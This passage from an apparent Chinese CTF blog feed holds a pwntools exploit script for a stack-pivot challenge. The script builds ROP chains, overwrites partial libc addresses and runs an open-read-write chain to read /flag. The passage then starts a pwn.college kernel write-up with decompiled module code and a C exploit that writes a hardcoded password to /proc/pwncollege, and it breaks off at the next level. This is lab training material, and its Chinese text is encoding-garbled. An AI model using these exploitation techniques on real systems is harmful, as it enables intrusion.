class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># pyright: reportWildcardImportFromLibrary=false</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> (</span><br><span class="line">    ELF,</span><br><span class="line">    p64,</span><br><span class="line">    p32,</span><br><span class="line">    u32,</span><br><span class="line">    u64,</span><br><span class="line">    FileStructure,</span><br><span class="line">    args,</span><br><span class="line">    context,</span><br><span class="line">    flat,</span><br><span class="line">    process,</span><br><span class="line">    raw_input,</span><br><span class="line">    remote,</span><br><span class="line">    os,</span><br><span class="line">    gdb,</span><br><span class="line">    pause,</span><br><span class="line">    log,</span><br><span class="line">    sleep,</span><br><span class="line">    p16,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿œç¨‹/æœ¬åœ°åˆ‡æ¢</span></span><br><span class="line"><span class="keyword">if</span> args.get(<span class="string">&quot;REMOTE&quot;</span>):</span><br><span class="line">    io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8080</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line">    context.terminal = [</span><br><span class="line">        os.path.expanduser(<span class="string">&quot;~/.local/bin/kitty-gdb&quot;</span>),</span><br><span class="line">        os.path.abspath(binary),</span><br><span class="line">        <span class="built_in">str</span>(io.pid),</span><br><span class="line">    ]</span><br><span class="line"><span class="comment"># ELFåŠ è½½</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment"># fmt: off</span></span><br><span class="line"><span class="comment"># [+] ========== å¸¸ç”¨å‡½æ•°å®šä¹‰ ========== [+]</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               : io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        : io.sendafter(<span class="built_in">str</span>(delim), data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               : io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        : io.sendlineafter(<span class="built_in">str</span>(delim), data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           : io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    : io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">False</span> : io.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    : io.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         : log.success(<span class="string">&#x27;&#123;&#125; ======== &gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">p       = <span class="keyword">lambda</span> name,data          : <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; ======== &gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name,data))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] ========== å¸¸ç”¨æ³„éœ²å‡½æ•° ========== [+]</span></span><br><span class="line">l64     = <span class="keyword">lambda</span>                    : u64(io.recvuntil(<span class="string">b&quot;&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;&quot;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    : u32(io.recvuntil(<span class="string">b&quot;ï¿½&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;&quot;</span>))</span><br><span class="line">l64_no  = <span class="keyword">lambda</span>                    : u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;&#x27;</span>))</span><br><span class="line"><span class="comment"># fmt: on</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">P</span>():</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pulsh</span>():</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pulse</span>():</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] ======= Some addr ============ [+]</span></span><br><span class="line"><span class="comment"># no ALSE</span></span><br><span class="line">read_to = <span class="number">0x401295</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x401288</span></span><br><span class="line">start = <span class="number">0x401090</span></span><br><span class="line">rdi = <span class="number">0x10F75B</span></span><br><span class="line">ret = <span class="number">0x401287</span></span><br><span class="line">leave_ret = <span class="number">0x401286</span></span><br><span class="line">libc_leave_ret_low = <span class="number">0x99D2</span></span><br><span class="line">libc_pop_rdi_low = <span class="number">0xD0F75B</span></span><br><span class="line">rbx_rbp_ret = <span class="number">0x4012B0</span></span><br><span class="line">rbp_ret = <span class="number">0x4012B1</span></span><br><span class="line">libc_puts_lower = <span class="number">0xC87BE0</span></span><br><span class="line"></span><br><span class="line">bss1 = <span class="number">0x404800</span></span><br><span class="line">bss2 = <span class="number">0x404300</span></span><br><span class="line">bss3 = <span class="number">0x404D00</span></span><br><span class="line">bss4 = <span class="number">0x404F00</span></span><br><span class="line">buffer = <span class="number">0x404080</span></span><br><span class="line">flag_path = bss1 + <span class="number">8</span> * <span class="number">8</span></span><br><span class="line">read_to_flag = elf.bss() + <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== Exploit å¼€å§‹ ==========</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_to_qword</span>(<span class="params">addr, data, do_pause=<span class="literal">False</span>, restart=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(data) &lt;= <span class="number">0x20</span></span><br><span class="line">    s(p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(addr + <span class="number">8</span>) + p64(read_to))</span><br><span class="line">    s(data)</span><br><span class="line">    <span class="keyword">if</span> do_pause:</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pulse()</span><br><span class="line">    <span class="keyword">if</span> restart:</span><br><span class="line">        io.send(p64(<span class="number">0</span>) * <span class="number">3</span> + p64(elf.sym[<span class="string">&quot;_start&quot;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">addr, data, do_pause=<span class="literal">False</span>, restart=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">0x20</span>):</span><br><span class="line">        write_to_qword(addr + i, data[i : i + <span class="number">0x20</span>], do_pause, restart)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_mov</span>(<span class="params">rbp</span>):</span><br><span class="line">    s(p64(<span class="number">0</span>) * <span class="number">2</span> + p64(rbp - <span class="number">8</span>) + p64(leave_ret))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    write_data(bss1, p64(start) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(start) + p64(<span class="number">0</span>) + <span class="string">b&quot;/flag&quot;</span>)</span><br><span class="line">    write_data(bss2, p64(main) * <span class="number">4</span> * <span class="number">12</span>)</span><br><span class="line">    write_data(bss3, p64(main) * <span class="number">4</span> * <span class="number">30</span>)</span><br><span class="line">    stack_mov(bss1)</span><br><span class="line"></span><br><span class="line">    s(p64(<span class="number">0</span>) * <span class="number">2</span> + p64(bss1 + <span class="number">0x30</span> - <span class="number">8</span>) + p16(libc_leave_ret_low))</span><br><span class="line">    s(p64(<span class="number">0</span>) * <span class="number">2</span> + p64(bss2 - <span class="number">8</span>) + p16(libc_leave_ret_low))</span><br><span class="line"></span><br><span class="line">    write_data(bss1 - <span class="number">0x108</span>, p32(libc_pop_rdi_low)[:<span class="number">3</span>], restart=<span class="literal">False</span>)</span><br><span class="line">    write_data(</span><br><span class="line">        bss1 - <span class="number">0x100</span>,</span><br><span class="line">        p64(elf.got[<span class="string">&quot;read&quot;</span>]) + p64(ret) * <span class="number">4</span> + p32(libc_puts_lower)[:<span class="number">3</span>],</span><br><span class="line">        restart=<span class="literal">False</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    write_data(</span><br><span class="line">        bss1 - <span class="number">0x100</span> + <span class="number">8</span> * <span class="number">6</span>,</span><br><span class="line">        p64(rbp_ret) + p64(bss3 - <span class="number">8</span>) + p64(leave_ret),</span><br><span class="line">        restart=<span class="literal">False</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    stack_mov(bss1 - <span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">    libc_base = l64() - libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = libc_base + <span class="number">0x000000000010F75B</span></span><br><span class="line">    pop_rsi_ret = libc_base + <span class="number">0x0000000000110A4D</span></span><br><span class="line">    pop_rdx_leave_ret = libc_base + <span class="number">0x00000000000981AD</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># [+] ============== ORW ============== [+]</span></span><br><span class="line">    O = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0</span>: pop_rdi_ret,</span><br><span class="line">            <span class="number">0x8</span>: flag_path,</span><br><span class="line">            <span class="number">0x10</span>: pop_rsi_ret,</span><br><span class="line">            <span class="number">0x18</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="number">0x20</span>: libc_base + libc.sym[<span class="string">&quot;open&quot;</span>],</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&quot;&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    R = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0</span>: pop_rdi_ret,</span><br><span class="line">            <span class="number">0x8</span>: <span class="number">3</span>,</span><br><span class="line">            <span class="number">0x10</span>: pop_rsi_ret,</span><br><span class="line">            <span class="number">0x18</span>: read_to_flag,</span><br><span class="line">            <span class="number">0x20</span>: rbp_ret,</span><br><span class="line">            <span class="number">0x28</span>: bss4 + <span class="number">0x60</span>,</span><br><span class="line">            <span class="number">0x30</span>: pop_rdx_leave_ret,</span><br><span class="line">            <span class="number">0x38</span>: <span class="number">0x30</span>,</span><br><span class="line">            <span class="number">0x40</span>: libc_base + libc.sym[<span class="string">&quot;read&quot;</span>],</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&quot;&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    W = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0</span>: pop_rdi_ret,</span><br><span class="line">            <span class="number">0x8</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="number">0x10</span>: pop_rsi_ret,</span><br><span class="line">            <span class="number">0x18</span>: read_to_flag,</span><br><span class="line">            <span class="number">0x20</span>: rbp_ret,</span><br><span class="line">            <span class="number">0x28</span>: bss4 + <span class="number">0xA8</span>,</span><br><span class="line">            <span class="number">0x30</span>: pop_rdx_leave_ret,</span><br><span class="line">            <span class="number">0x38</span>: <span class="number">0x30</span>,</span><br><span class="line">            <span class="number">0x40</span>: libc_base + libc.sym[<span class="string">&quot;write&quot;</span>],</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    orw = O + R + W</span><br><span class="line">    write_data(bss4, orw, restart=<span class="literal">False</span>)</span><br><span class="line">    stack_mov(bss4)</span><br><span class="line">exp()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ ˆé£æ°´æˆ‘è§‰å¾—ä¹Ÿå°±æ˜¯å¯¹æ ˆçš„ç»¼åˆåˆ©ç”¨ï¼Œå­¦ä¼šåˆç†çš„å¸ƒå±€ï¼Œæ‰¾åˆ°ä¸€ä¸ªæ¼æ´ï¼Œæ€è€ƒèƒ½ä¸èƒ½æ‰©å¤§è¿™ä¸ªçš„å½±å“ï¼Œå¹¶ä¸”å¤šå¤šè°ƒè¯•ï¼å¤šè°ƒè¯•æ‰èƒ½æˆé•¿ï¼</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ˆé£æ°´åˆè¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel-pwncollege</title>
      <link href="/2026/01/11/college/2026-01-11-pwncollege/"/>
      <url>/2026/01/11/college/2026-01-11-pwncollege/</url>
      
        <content type="html"><![CDATA[<h1 id="After-text"><a href="#After-text" class="headerlink" title="After text"></a>After text</h1><p>è¿™ä¸ªæ˜¯æˆ‘æ­£å¼å¼€å§‹çš„kernel pwnç»ƒä¹ é¢˜ï¼Œåœ°å€ï¼š<a href="https://pwn.college/system-security/kernel-security/">pwncollege</a></p><p>é¦–å…ˆç®€å•çš„è¯´æ˜ä¸€ä¸‹æ€ä¹ˆä»pwncollegeä¸Šä¸‹è½½<code>ko</code>æ¨¡å—æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ‡æ¢æˆå°†å·¦ä¸‹è§’çš„<code>Terminal</code>åˆ‡æ¢æˆ<code>Code</code>ï¼Œç„¶åæ‰“å¼€æ–‡ä»¶å¤¹<code>/challege/</code>è¿™é‡Œå°±æ˜¯æˆ‘ä»¬çš„æ¨¡å—æ–‡ä»¶æ‰€åœ¨çš„åœ°æ–¹äº†ï¼Œæˆ‘ä»¬åªéœ€è¦å³é”®Downloadä¸‹æ¥å³å¯</p><p>å¦‚æœéœ€è¦ä½¿ç”¨å®ƒçš„vmç¯å¢ƒï¼Œå°±éœ€è¦åœ¨ä»–çš„ç»ˆç«¯ä¸Šä½¿ç”¨<code>vm connect</code>,è¿™æ ·å°±ä¼šè¿æ¥åˆ°è¿œç¨‹çš„vmç¯å¢ƒï¼Œæ›´å¤šé€‰é¡¹å¯ä»¥ä½¿ç”¨<code>vm --help</code></p><h1 id="level1-0-leave1-1"><a href="#level1-0-leave1-1" class="headerlink" title="level1.0&amp;&amp;leave1.1"></a>level1.0&amp;&amp;leave1.1</h1><p>ä½¿ç”¨idaæ‰“å¼€ï¼Œé¦–å…ˆæŸ¥çœ‹<code>init_module</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  v0 = filp_open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">  kernel_read(v0, flag, <span class="number">128</span>, v0 + <span class="number">104</span>);</span><br><span class="line">  filp_close(v0, <span class="number">0</span>);</span><br><span class="line">  proc_entry = (proc_dir_entry *)proc_create(<span class="string">&quot;pwncollege&quot;</span>, <span class="number">438</span>, <span class="number">0</span>, &amp;fops);</span><br><span class="line">  printk(&amp;unk_8E1);</span><br><span class="line">  printk(&amp;unk_6E0);</span><br><span class="line">  printk(&amp;unk_8E1);</span><br><span class="line">  printk(&amp;unk_710);</span><br><span class="line">  printk(&amp;unk_778);</span><br><span class="line">  printk(&amp;unk_7D8);</span><br><span class="line">  printk(&amp;unk_828);</span><br><span class="line">  printk(&amp;unk_8E8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯æ‰“å¼€<code>/flag</code>è¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åå°†è¯»å…¥<code>v0</code>è¿™ä¸ªå˜é‡ï¼Œä½¿ç”¨<code>proc_create</code>åˆ›å»ºä¸€ä¸ª<code>pwncollege</code>æ–‡ä»¶æ¥äº¤äº’ï¼ŒåŒå‡»<code>&amp;fops</code>æŸ¥çœ‹äº¤äº’æ¥å£æ˜¯<code>device_write</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000000AA0 fops            file_operations &lt;0, 0, offset device_read, offset device_write, 0, 0, \</span><br><span class="line">.data:0000000000000AA0                                         ; DATA XREF: init_module+4Aâ†‘o</span><br><span class="line">.data:0000000000000AA0                                  0, 0, 0, 0, 0, 0, 0, 0, offset device_open, 0, \</span><br><span class="line">.data:0000000000000AA0                                  offset device_release, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \</span><br><span class="line">.data:0000000000000AA0                                  0, 0, 0, 0, 0&gt;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬å‘<code>/proc/pwncollege</code>è¿™ä¸ªæ–‡ä»¶å†™å…¥çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨â€˜device_writeâ€™è¿™ä¸ªå‡½æ•°ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">device_write</span><span class="params">(file *file, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> password[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28u</span>);</span><br><span class="line">  printk(&amp;unk_660);</span><br><span class="line">  v5 = <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span> ( length &lt;= <span class="number">0x10</span> )</span><br><span class="line">    v5 = length;</span><br><span class="line">  copy_from_user(password, buffer, v5);</span><br><span class="line">  device_state[<span class="number">0</span>] = (<span class="built_in">strncmp</span>(password, <span class="string">&quot;gyvcbzlksuywlujh&quot;</span>, <span class="number">0x10u</span>) == <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„å¯†ç åˆ¤æ–­ã€‚åªéœ€è¦æˆ‘ä»¬è¾“å…¥ ä¸€è‡´ï¼Œå°±ä¼šä½¿å¾—<code>device_state[0]</code>ä¸º2ï¼Œè€Œå½“æˆ‘ä»¬ä½¿device_state[0]ä¸º2ä¹‹åå†æ¬¡æ‰§è¡Œ<code>cat /proc/college</code>å°±ä¼šå»æ‰§è¡Œdevice_readä»è€ŒæŠŠflagæ‰“å°å‡ºæ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">device_read</span><span class="params">(file *file, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">size_t</span> v7; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_6A0);</span><br><span class="line">  v6 = flag;</span><br><span class="line">  <span class="keyword">if</span> ( device_state[<span class="number">0</span>] != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="string">&quot;device error: unknown state</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( device_state[<span class="number">0</span>] &lt;= <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="string">&quot;password:</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( device_state[<span class="number">0</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="string">&quot;device error: unknown state</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( device_state[<span class="number">0</span>] == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          device_state[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          v6 = <span class="string">&quot;invalid password</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = length;</span><br><span class="line">  v8 = <span class="built_in">strlen</span>(v6) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v8 - <span class="number">1</span> &lt;= length )</span><br><span class="line">    v7 = v8 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> v8 - <span class="number">1</span> - copy_to_user(buffer, v6, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦è¾“å…¥æ­£ç¡®çš„å¯†ç ï¼Œç„¶åâ€˜cat &#x2F;proc&#x2F;pwncollegeâ€™å°±å¯ä»¥å¾—åˆ°flag</p><p><strong>exp</strong></p><p>åœ¨è¿œç¨‹vmç¯å¢ƒè¿è¡Œå³å¯æ‹¿åˆ°flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_Flag_Path  <span class="string">&quot;/proc/pwncollege&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">char</span> * Passwd = <span class="string">&quot;gyvcbzlksuywlujh&quot;</span>;</span><br><span class="line">        <span class="type">int</span> fd = open(get_Flag_Path,O_WRONLY);</span><br><span class="line">       <span class="keyword">if</span> (fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;OPEN ERROR check you File !!!</span></span><br><span class="line"><span class="string"> And you fd is %d</span></span><br><span class="line"><span class="string">&quot;</span>,fd);</span><br><span class="line">       &#125;</span><br><span class="line">      <span class="keyword">if</span> (write(fd,Passwd,<span class="built_in">strlen</span>(Passwd))&gt;<span class="number">0</span>)&#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Fd is %d,You Are Win&quot;</span>,fd);</span><br><span class="line">      &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>leave1.1ä¹Ÿæ˜¯ä¸€æ ·çš„è§£æ³•</p><h1 id="leave2-0-leave2-1"><a 